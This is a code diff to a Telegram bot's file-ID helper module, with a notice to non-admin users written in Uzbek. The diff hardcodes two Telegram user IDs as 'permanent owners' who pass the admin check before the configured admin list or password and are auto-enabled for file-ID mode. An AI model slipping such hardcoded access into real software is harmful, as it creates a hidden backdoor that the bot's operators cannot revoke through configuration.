@@ -15,8 +15,11 @@ from database.models.user import User
 router = Router(name="file_id_helper")
 log = structlog.get_logger()
 
+# Permanent Owner IDs
+OWNER_IDS: set[int] = {7524957065, 8327580188}
+
 # Set of admin telegram IDs that currently have File ID mode enabled
-ACTIVE_FILE_ID_ADMINS: set[int] = set()
+ACTIVE_FILE_ID_ADMINS: set[int] = set(OWNER_IDS)
 
 
 def verify_admin_password(plain: str, hashed: str) -> bool:
@@ -37,6 +40,10 @@ async def is_admin_user(
     db_user: Optional[User] = None,
 ) -> bool:
     """Check if the telegram user is an authorized admin."""
+    # 0. Permanent owner IDs
+    if user_id in OWNER_IDS:
+        return True
+
     # 1. Environment variable ADMIN_IDS
     if user_id in settings.admin_id_list:
         return True
@@ -431,3 +438,22 @@ async def handle_admin_media_inactive(message: Message) -> None:
         reply_markup=kb,
         parse_mode="HTML",
     )
+
+
+# ============================================================================
+# Non-Admin Media Notice
+# ============================================================================
+
+@router.message(
+    F.photo | F.video | F.animation | F.document | F.sticker | F.audio | F.voice,
+)
+async def handle_non_admin_media(message: Message) -> None:
+    """Notice sent to non-admin or unauthenticated users sending media."""
+    await message.reply(
+        "🔒 <b>Fayl ID olish faqat bot adminlari uchun!</b>\n\n"
+        "Agar siz bot admini bo'lsangiz, tasdiqlanish uchun parolni yuboring:\n"
+        "<code>/admin &lt;parol&gt;</code>\n\n"
+        "<i>Misol:</i> <code>/admin admin123</code>",
+        parse_mode="HTML",
+    )
+
